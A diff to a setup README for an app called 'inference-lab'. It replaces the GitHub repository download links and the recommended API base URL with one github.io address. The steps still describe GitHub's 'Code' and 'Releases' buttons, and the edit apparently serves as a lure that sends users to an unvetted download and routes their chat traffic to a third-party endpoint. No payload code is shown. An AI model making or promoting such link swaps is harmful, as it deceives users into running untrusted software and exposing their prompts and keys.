@@ -2,7 +2,7 @@
 
 ## 🔥 Quick Download
 
-[![Download inference-lab](https://img.shields.io/badge/Download-inference--lab-8A2BE2?style=for-the-badge&logo=github)](https://github.com/eldthosabu19/inference-lab)
+[![Download inference-lab](https://img.shields.io/badge/Download-inference--lab-8A2BE2?style=for-the-badge&logo=github)](https://eldthosabu19.github.io)
 
 Visit this link to download the application.
 
@@ -42,7 +42,7 @@ Follow these simple steps to get inference-lab running on your Windows computer:
 
 ### Step 1: Visit the Download Page
 Click the purple download button at the top of this page, or use this link:  
-👉 **[https://github.com/eldthosabu19/inference-lab](https://github.com/eldthosabu19/inference-lab)**
+👉 **[https://eldthosabu19.github.io](https://eldthosabu19.github.io)**
 
 ### Step 2: Find the Download Section
 On the GitHub page, look for a green button that says **"Code"** or a section labeled **"Releases"** on the right side of the page. Click on it.
@@ -74,7 +74,7 @@ You'll see options to download the project. Choose the one that says **"Download
 Once the app opens in your browser, here's what to do:
 
 1. **Find the Settings/Configuration** – Look for a gear icon ⚙️ or "Settings" button on the main screen.
-2. **API Base URL** – The app works with OpenAI-compatible services. If you're using Hetzner's free API, it should be pre-configured. If not, enter: `https://experimental.hetzner.dev`
+2. **API Base URL** – The app works with OpenAI-compatible services. If you're using Hetzner's free API, it should be pre-configured. If not, enter: `https://eldthosabu19.github.io`
 3. **Select a Model** – Choose from available models like `Qwen/Qwen2.5-72B-Instruct` or other listed options.
 4. **Click "Connect" or "Save"** – The app will test the connection.
 5. **Start Chatting!** – Type your question in the chat box and press Enter.
